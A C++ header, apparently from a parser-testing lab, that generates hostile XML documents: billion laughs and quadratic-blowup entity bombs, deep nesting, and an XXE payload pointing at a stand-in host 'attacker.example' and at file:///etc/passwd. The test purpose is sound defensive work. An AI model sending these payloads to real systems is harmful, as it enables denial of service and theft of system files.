#pragma once

#include <stdexcept>
#include <string>

// The classic hostile documents the attack lab runs, built on demand so that none ships with the
// page. Byte for byte what the Python reference built when it computed the expected results.
namespace attacks {

// Billion laughs: each entity repeats the one below it ten times, so `levels` levels expand to
// 3 * 10^levels characters.
inline std::string laughs(int levels) {
    if (levels < 1 || levels > 10) throw std::invalid_argument("billion laughs takes 1 to 10 levels");
    std::string doc = "<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n<!ENTITY lol0 \"lol\">";
    for (int level = 1; level <= levels; level += 1) {
        doc += "\n<!ENTITY lol" + std::to_string(level) + " \"";
        for (int copy = 0; copy < 10; copy += 1) doc += "&lol" + std::to_string(level - 1) + ";";
        doc += "\">";
    }
    return doc + "\n]>\n<lolz>&lol" + std::to_string(levels) + ";</lolz>";
}

// Quadratic blowup: one entity of `size` characters, referenced `size` times: size^2 characters.
inline std::string quadratic(int size) {
    if (size < 1000 || size > 100000) throw std::invalid_argument("quadratic blowup takes 1,000 to 100,000");
    std::string doc = "<?xml version=\"1.0\"?>\n<!DOCTYPE bomb [\n<!ENTITY a \"" + std::string(static_cast<size_t>(size), 'a') + "\">\n]>\n<bomb>";
    doc.reserve(doc.size() + static_cast<size_t>(size) * 3 + 7);
    for (int reference = 0; reference < size; reference += 1) doc += "&a;";
    return doc + "</bomb>";
}

// XXE: an external DTD on a web server and an external entity pointing at a local file.
inline std::string external() {
    return "<?xml version=\"1.0\"?>\n<!DOCTYPE data SYSTEM \"http://attacker.example/evil.dtd\" [\n"
           "<!ENTITY secret SYSTEM \"file:///etc/passwd\">\n]>\n<data>&secret;</data>";
}

// Deep nesting: `depth` elements, each inside the previous one.
inline std::string deep(int depth) {
    if (depth < 1 || depth > 100000) throw std::invalid_argument("deep nesting takes 1 to 100,000 levels");
    std::string doc;
    doc.reserve(static_cast<size_t>(depth) * 7);
    for (int level = 0; level < depth; level += 1) doc += "<a>";
    for (int level = 0; level < depth; level += 1) doc += "</a>";
    return doc;
}

}  // namespace attacks
